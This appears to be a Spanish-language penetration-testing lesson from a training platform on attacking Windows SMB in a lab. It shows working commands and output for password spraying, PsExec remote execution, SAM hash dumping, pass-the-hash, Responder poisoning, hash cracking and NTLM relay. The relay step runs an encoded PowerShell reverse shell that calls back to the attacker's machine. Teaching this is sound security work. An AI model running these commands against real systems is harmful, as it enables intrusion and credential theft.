[*] Checking LDAPS (timeout: 5s)
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB (timeout: 5s)
[*] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS (timeout: 5s)
[*] SMB over NetBIOS is accessible on 139/tcp

 ===================================================                            
|    NetBIOS Names and Workgroup for 10.10.11.45    |
 ===================================================                                                                                         
[*] Got domain/workgroup name: WORKGROUP
[*] Full NetBIOS names information:
- WIN-752039204 <00> -          B <ACTIVE>  Workstation Service
- WORKGROUP     <00> -          B <ACTIVE>  Workstation Service
- WIN-752039204 <20> -          B <ACTIVE>  Workstation Service
- MAC Address = 00-0C-29-D7-17-DB
...
 ========================================
|    SMB Dialect Check on 10.10.11.45    |
 ========================================

<SNIP>
```

---

## Ataques Específicos de Protocolo

Si una sesión nula no está habilitada, necesitaremos credenciales para interactuar con el protocolo SMB. Dos formas comunes de obtener credenciales son [forzamiento bruto](https://en.wikipedia.org/wiki/Brute-force_attack) y [pulverización de contraseña](https://owasp.org/www-community/attacks/Password_Spraying_Attack).

#### Forzamiento Bruto y Spray de Contraseña

Al forzar brutamente, intentamos tantas contraseñas como sea posible contra una cuenta, pero puede bloquear una cuenta si alcanzamos el umbral. Podemos usar la fuerza bruta y detenernos antes de alcanzar el umbral si lo sabemos. De lo contrario, no recomendamos usar fuerza bruta.

La pulverización de contraseñas es una mejor alternativa, ya que podemos orientar una lista de nombres de usuario con una contraseña común para evitar bloqueos de cuentas. Podemos probar más de una contraseña si conocemos el umbral de bloqueo de la cuenta. Por lo general, dos o tres intentos son seguros, siempre que esperemos 30-60 minutos entre intentos. Exploremos la herramienta [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) eso incluye la capacidad de ejecutar la pulverización de contraseñas.

Con CrackMapExec (CME), podemos apuntar a múltiples IP, utilizando numerosos usuarios y contraseñas. Exploremos un caso de uso diario para la pulverización de contraseñas. Para realizar un spray de contraseña contra una IP, podemos usar la opción `-u` para especificar un archivo con una lista de usuarios y `-p` para especificar una contraseña. Esto intentará autenticar a cada usuario de la lista utilizando la contraseña proporcionada.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ cat /tmp/userlist.txt

Administrator
jrodriguez 
admin
<SNIP>
jurena
```

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```

**Nota:** De forma predeterminada, CME saldrá después de encontrar un inicio de sesión exitoso. Usando el `--continue-on-success` flag continuará rociando incluso después de que se encuentre una contraseña válida, es muy útil para rociar una sola contraseña contra una gran lista de usuarios. Además, si estamos apuntando a una computadora no unida al dominio, tendremos que usar la opción `--local-auth`. Para un estudio más detallado de Spraying de contraseñas, consulte el módulo Enumeración y ataques de Active Directory.

Para obtener instrucciones de uso más detalladas, consulte las herramientas [guía de documentación](https://web.archive.org/web/20220129050920/https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials).

#### SMB

Los servidores SMB de Linux y Windows proporcionan diferentes rutas de ataque. Por lo general, solo tendremos acceso al sistema de archivos, privilegios de abuso o vulnerabilidades conocidas en un entorno Linux, como discutiremos más adelante en esta sección. Sin embargo, en Windows, la superficie de ataque es más significativa.

Al atacar un servidor SMB de Windows, nuestras acciones estarán limitadas por los privilegios que teníamos sobre el usuario que logramos comprometer. Si este usuario es Administrador o tiene privilegios específicos, podremos realizar operaciones como:

- Ejecución de Comando Remoto
- Extraer Hashes de la base de datos SAM
- Enumerar Usuarios Iniciados
- Pass-the-Hash (PTH)

Discutamos cómo podemos realizar tales operaciones. Además, aprenderemos cómo se puede abusar del protocolo SMB para recuperar el hash de un usuario como un método para escalar privilegios u obtener acceso a una red.

#### Ejecución Remota de Código (RCE)

Antes de saltar a cómo ejecutar un comando en un sistema remoto usando SMB, hablemos de Sysinternals. El sitio web de Windows Sysinternals fue creado en 1996 por [Mark Russinovich](https://en.wikipedia.org/wiki/Mark_Russinovich) y [Bryce Cogswell](https://en-academic.com/dic.nsf/enwiki/2358707) para ofrecer recursos técnicos y utilidades para administrar, diagnosticar, solucionar problemas y monitorear un entorno de Microsoft Windows. Microsoft adquirió Windows Sysinternals y sus activos el 18 de julio de 2006.

Sysinternals presentó varias herramientas gratuitas para administrar y monitorear computadoras que ejecutan Microsoft Windows. El software ahora se puede encontrar en el [Sitio web de microsoft](https://docs.microsoft.com/en-us/sysinternals/). Una de esas herramientas gratuitas para administrar sistemas remotos es PsExec.

[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) es una herramienta que nos permite ejecutar procesos en otros sistemas, completos con total interactividad para aplicaciones de consola, sin tener que instalar el software cliente manualmente. Funciona porque tiene una imagen de servicio de Windows dentro de su ejecutable. Toma este servicio y lo implementa en el recurso compartido admin$ (de forma predeterminada) en la máquina remota. Luego utiliza la interfaz DCE/RPC sobre SMB para acceder a la API de Windows Service Control Manager. A continuación, inicia el servicio PSExec en la máquina remota. El servicio PSExec crea entonces un [llamada tubería](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) eso puede enviar comandos al sistema.

Podemos descargar PsExec desde [Sitio web de microsoft](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)o podemos usar algunas implementaciones de Linux:

- [PsExec Impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) Python PsExec como ejemplo de funcionalidad usando [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacte SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - Un enfoque similar a PsExec sin usar [RemComSvc](https://github.com/kavika13/RemCom). La técnica se describe aquí. Esta implementación va un paso más allá, instanciando un servidor SMB local para recibir la salida de los comandos. Esto es útil cuando la máquina de destino NO tiene una acción escribible disponible.
- [Impactar atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) este ejemplo ejecuta un comando en la máquina de destino a través del servicio Programador de tareas y devuelve la salida del comando ejecutado.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - incluye una implementación de `smbexec` y `atexec`.
- [PsExec Metasploit](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Implementación de Ruby PsExec.

#### PsExec Impacket

Para usar `impacket-psexec`, necesitamos proporcionar el dominio/nombre de usuario, la contraseña y la dirección IP de nuestra máquina de destino. Para obtener información más detallada, podemos utilizar la ayuda de impacket:

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ impacket-psexec -h

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]
                 [-target-ip ip address] [-port [destination port]] [-service-name service_name] [-remote-binary-name remote_binary_name]
                 target [command ...]

PSEXEC like functionality example using RemComSvc.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               command (or arguments if -c is used) to execute at the target (w/o path) - (default:cmd.exe)

optional arguments:
  -h, --help            show this help message and exit
  -c pathname           copy the filename for later execution, arguments are passed in the command option
  -path PATH            path of the command to execute
  -file FILE            alternative RemCom binary (be sure it doesn't require CRT)
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve
                        it
  -port [destination port]
                        Destination port to connect to SMB Server
  -service-name service_name
                        The name of the service used to trigger the payload
  -remote-binary-name remote_binary_name
                        This will be the name of the executable uploaded on the target
```

Para conectarse a una máquina remota con una cuenta de administrador local, utilizando `impacket-psexec`, puede utilizar el siguiente comando:

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.110.17.....
[*] Found writable share ADMIN$
[*] Uploading file EHtJXgng.exe
[*] Opening SVCManager on 10.10.110.17.....
[*] Creating service nbAc on 10.10.110.17.....
[*] Starting service nbAc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19041.1415]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami && hostname

nt authority\system
WIN7BOX
```

Las mismas opciones se aplican a `impacket-smbexec` y `impacket-atexec`.

#### CrackMapExec

Otra herramienta que podemos usar para ejecutar CMD o PowerShell es `CrackMapExec`. Una ventaja de `CrackMapExec` es la disponibilidad para ejecutar un comando en múltiples host a la vez. Para usarlo, necesitamos especificar el protocolo, `smb`, la dirección IP o el rango de direcciones IP, la opción `-u` para nombre de usuario, y `-p` para la contraseña y la opción `-x` para ejecutar comandos cmd o mayúsculas `-X` para ejecutar comandos de PowerShell.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
SMB         10.10.110.17 445    WIN7BOX  nt authority\system
```

**Nota:** Si el`--exec-method` no está definido, CrackMapExec intentará ejecutar el método atexec, si falla puede intentar especificar el `--exec-method` smbexec.

#### Enumerar Usuarios Iniciados

Imagina que estamos en una red con múltiples máquinas. Algunos de ellos comparten la misma cuenta de administrador local. En este caso, podríamos usar `CrackMapExec` para enumerar usuarios registrados en todas las máquinas dentro de la misma red `10.10.110.17/24`, lo que acelera nuestro proceso de enumeración.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\Administrator             logon_server: WIN7BOX
SMB         10.10.110.17 445    WIN7BOX  WIN7BOX\jurena                    logon_server: WIN7BOX
SMB         10.10.110.21 445    WIN10BOX  [*] Windows 10.0 Build 19041 (name:WIN10BOX) (domain:WIN10BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.21 445    WIN10BOX  [+] WIN10BOX\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.21 445    WIN10BOX  [+] Enumerated loggedon users
SMB         10.10.110.21 445    WIN10BOX  WIN10BOX\demouser                logon_server: WIN10BOX
```

#### Extraer Hashes de la base de datos SAM

El Security Account Manager (SAM) es un archivo de base de datos que almacena las contraseñas de los usuarios. Se puede utilizar para autenticar usuarios locales y remotos. Si obtenemos privilegios administrativos en una máquina, podemos extraer los hashes de la base de datos SAM para diferentes propósitos:

- Autenticar como otro usuario.
- Cracking de contraseñas, si logramos descifrar la contraseña, podemos intentar reutilizar la contraseña para otros servicios o cuentas.
- Pase el Hash. Lo discutiremos más adelante en esta sección.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
```

#### Pass-the-Hash (PtH)

Si logramos obtener un hash NTLM de un usuario, y si no podemos descifrarlo, aún podemos usar el hash para autenticarse sobre SMB con una técnica llamada Pass-the-Hash (PtH). PtH permite a un atacante autenticarse en un servidor o servicio remoto utilizando el hash NTLM subyacente de la contraseña de un usuario en lugar de la contraseña de texto sin formato. Podemos usar un ataque PtH con cualquier `Impacket` herramienta, `SMBMap`, `CrackMapExec`, entre otras herramientas. Aquí hay un ejemplo de cómo funcionaría esto `CrackMapExec`:

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```

#### Ataques de Autenticación Forzada

También podemos abusar del protocolo SMB creando un servidor SMB falso para capturar los usuarios [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

La herramienta más común para realizar tales operaciones es la `Responder`. [Respondedor](https://github.com/lgandx/Responder) es una herramienta envenenadora LLMNR, NBT-NS y MDNS con diferentes capacidades, una de ellas es la posibilidad de configurar servicios falsos, incluido SMB, para robar hashes NetNTLM v1/v2. En su configuración predeterminada, encontrará tráfico LLMNR y NBT-NS. Luego, responderá en nombre de los servidores que la víctima está buscando y capturará sus hashes NetNTLM.

Ilustremos un ejemplo para entender mejor cómo `Responder` obras. Imagine que creamos un servidor SMB falso utilizando la configuración predeterminada Responder, con el siguiente comando:

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ responder -I <interface name>
```

Cuando un usuario o un sistema intenta realizar una Resolución de nombres (NR), una máquina realiza una serie de procedimientos para recuperar la dirección IP de un host por su nombre de host. En las máquinas con Windows, el procedimiento será aproximadamente el siguiente:

- Se requiere la dirección IP del recurso compartido del archivo de nombre de host.
- El archivo host local (C:\Windows\System32\Drivers\etc\hosts) se comprobará para obtener registros adecuados.
- Si no se encuentran registros, la máquina cambia a la caché DNS local, que realiza un seguimiento de los nombres resueltos recientemente.
- ¿No hay registro DNS local? Se enviará una consulta al servidor DNS que se ha configurado.
- Si todo lo demás falla, la máquina emitirá una consulta de multidifusión, solicitando la dirección IP del recurso compartido de archivos de otras máquinas de la red.

Supongamos que un usuario escribió mal el nombre de una carpeta compartida `\\mysharefoder\` en lugar de `\\mysharedfolder\`. En ese caso, todas las resoluciones de nombre fallarán porque el nombre no existe, y la máquina enviará una consulta de multidifusión a todos los dispositivos de la red, incluidos nosotros que ejecutamos nuestro servidor SMB falso. Esto es un problema porque no se toman medidas para verificar la integridad de las respuestas. Los atacantes pueden aprovechar este mecanismo escuchando tales consultas y falsificando respuestas, lo que lleva a la víctima a creer que los servidores maliciosos son confiables. Esta confianza se utiliza generalmente para robar credenciales.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ sudo responder -I ens33

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
               
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:                
    LLMNR                      [ON]
    NBT-NS                     [ON]        
    DNS/MDNS                   [ON]   
                                                                                                                                                                                          
[+] Servers:         
    HTTP server                [ON]                                   
    HTTPS server               [ON]
    WPAD proxy                 [OFF]                                  
    Auth proxy                 [OFF]
    SMB server                 [ON]                                   
    Kerberos server            [ON]                                   
    SQL server                 [ON]                                   
    FTP server                 [ON]                                   
    IMAP server                [ON]                                   
    POP3 server                [ON]                                   
    SMTP server                [ON]                                   
    DNS server                 [ON]                                   
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]                                   
                                                                                   
[+] HTTP Options:                                                                  
    Always serving EXE         [OFF]                                               
    Serving EXE                [OFF]                                               
    Serving HTML               [OFF]                                               
    Upstream Proxy             [OFF]                                               

[+] Poisoning Options:                                                             
    Analyze Mode               [OFF]                                               
    Force WPAD auth            [OFF]                                               
    Force Basic Auth           [OFF]                                               
    Force LM downgrade         [OFF]                                               
    Fingerprint hosts          [OFF]                                               

[+] Generic Options:                                                               
    Responder NIC              [tun0]                                              
    Responder IP               [10.10.14.198]                                      
    Challenge set              [random]                                            
    Don't Respond To Names     ['ISATAP']                                          

[+] Current Session Variables:                                                     
    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
    Responder Domain Name      [HF2L.LOCAL]                                        
    Responder DCE-RPC Port     [48162] 

[+] Listening for events... 

[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
```

Estas credenciales capturadas se pueden descifrar usando [hachís](https://hashcat.net/hashcat/) o retransmitido a un host remoto para completar la autenticación y hacerse pasar por el usuario.

Todos los hash guardados se encuentran en el directorio de registros de Responder (`/usr/share/responder/logs/`). Podemos copiar el hash a un archivo e intentar descifrarlo usando el módulo hashcat 5600.

**Nota:** Si observa múltiples hashes para una cuenta, esto se debe a que NTLMv2 utiliza un desafío del lado del cliente y del lado del servidor que se asigna al azar para cada interacción. Esto hace que los hashes resultantes que se envían se salen con una cadena aleatoria de números. Esta es la razón por la que los hashes no coinciden pero aún representan la misma contraseña.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386

ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc46296b0ccfc7a231d918ae1dae521:0101000000000000b09b51939ba6d40140c54ed46ad58e890000000002000e004e004f004d00410054004300480001000a0053004d0042003100320004000a0053004d0042003100320003000a0053004d0042003100320005000a0053004d0042003100320008003000300000000000000000000000003000004289286eda193b087e214f3e16e2be88fec5d9ff73197456c9a6861ff5b5d3330000000000000000:P@ssword
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)
Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 75776/14344386 (0.53%)
Rejected.........: 0/75776 (0.00%)
Restore.Point....: 73728/14344386 (0.51%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: compu -> kodiak1

Started: Mon Apr 11 16:49:34 2022
Stopped: Mon Apr 11 16:49:37 2022
```

El hash NTLMv2 se agrietó. La contraseña es `P@ssword`. Si no podemos descifrar el hash, potencialmente podemos transmitir el hash capturado a otra máquina usando [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) o Respondedor [MultiRelay.p](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Veamos un ejemplo usando `impacket-ntlmrelayx`.

Primero, necesitamos establecer SMB para `OFF` en nuestro archivo de configuración del respondedor (`/etc/responder/Responder.conf`).

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Luego ejecutamos `impacket-ntlmrelayx` con la opción `--no-http-server`, `-smb2support`, y la máquina de destino con la opción `-t`. Por defecto, `impacket-ntlmrelayx` volcará la base de datos SAM, pero podemos ejecutar comandos agregando la opción `-c`.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<SNIP>

[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146
[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED
[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Done dumping SAM hashes for host: 10.10.110.146
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

Podemos crear un shell inverso de PowerShell usando [https://www.revshells.com/](https://www.revshells.com/), establezca nuestra dirección IP de la máquina, puerto y la opción Powershell #3 (Base64).

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Una vez que la víctima se autentica en nuestro servidor, envenenamos la respuesta y hacemos que ejecute nuestro comando para obtener un shell inverso.

  Atacar a SMB

```shell-session
vcrdcr@htb[/htb]$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```

#### RPC

En el [Módulo de huella](https://academy.hackthebox.com/course/preview/footprinting), discutimos cómo enumerar una máquina usando RPC. Además de la enumeración, podemos usar RPC para hacer cambios en el sistema, tales como:

- Cambiar la contraseña de un usuario.
- Crear un nuevo usuario de dominio.
- Crear una nueva carpeta compartida.

También cubrimos la enumeración usando RPC en el [Módulo de enumeración y ataques de Active Directory](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks).

Tenga en cuenta que se requieren algunas configuraciones específicas para permitir este tipo de cambios a través de RPC. Podemos utilizar el [página de manual de RpClient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) o [Acceso SMB desde la Hoja de trucos de Linux](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) del Instituto SANS para explorar esto más a fondo.

# Últimas Vulnerabilidades SMB

---

Se llamó una vulnerabilidad significativa reciente que afectó el protocolo SMB [SMBGhost](https://arista.my.site.com/AristaCommunity/s/article/SMBGhost-Wormable-Vulnerability-Analysis-CVE-2020-0796) con el [CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796). La vulnerabilidad consistía en un mecanismo de compresión de la versión SMB v3.1.1 que hacía que Windows 10 versiones 1903 y 1909 fueran vulnerables al ataque de un atacante no autenticado. La vulnerabilidad permitió al atacante obtener la ejecución remota de código (`RCE`) y acceso completo al sistema de destino remoto.

